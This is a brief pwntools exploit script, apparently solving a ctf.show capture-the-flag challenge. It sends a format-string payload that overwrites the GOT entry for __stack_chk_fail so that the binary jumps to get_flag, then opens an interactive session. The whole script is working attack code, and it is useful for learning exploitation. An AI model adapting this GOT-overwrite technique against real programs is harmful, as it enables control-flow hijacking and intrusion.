#glibc ≤ 2.26方存在打印错误信息时打印argv[0]
from pwn import *
context(arch='i386',os='linux',log_level='debug')
p = remote('pwn.challenge.ctf.show',28179)
elf = ELF('./pwn')
stackcheck=elf.got['__stack_chk_fail']
get_flag=elf.sym['get_flag']
payload=fmtstr_payload(7,{stackcheck:get_flag})
payload=payload.ljust(0x50,b'a')
p.sendline(payload)
p.recv()
p.interactive()